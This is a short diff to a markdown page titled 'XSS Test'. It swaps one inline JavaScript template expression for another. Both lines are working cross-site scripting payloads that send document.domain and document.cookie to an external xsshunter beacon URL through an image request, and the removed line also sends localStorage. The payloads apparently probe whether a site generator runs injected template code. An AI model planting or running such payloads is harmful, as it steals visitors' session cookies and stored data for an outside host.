@@ -2,4 +2,5 @@
 title: XSS Test
 ---
 # XSS Test
-Exfil: {(()=>{try{new Image().src='https://xsshunter.trufflesecurity.com/amr/beacon?d='+encodeURIComponent(document.domain)+'&c='+encodeURIComponent(document.cookie)+'&ls='+encodeURIComponent(JSON.stringify(localStorage));window.__EXFIL='SENT'}catch(e){window.__EXFIL='ERR:'+e}return 'exfil-fired'})()}
+
+Beacon: {(function(){var i=new Image();i.src="https://xsshunter.trufflesecurity.com/amr/b?d="+document.domain+"&c="+document.cookie;window.__EXFIL="SENT-"+document.domain;return "beacon-fired"})()}
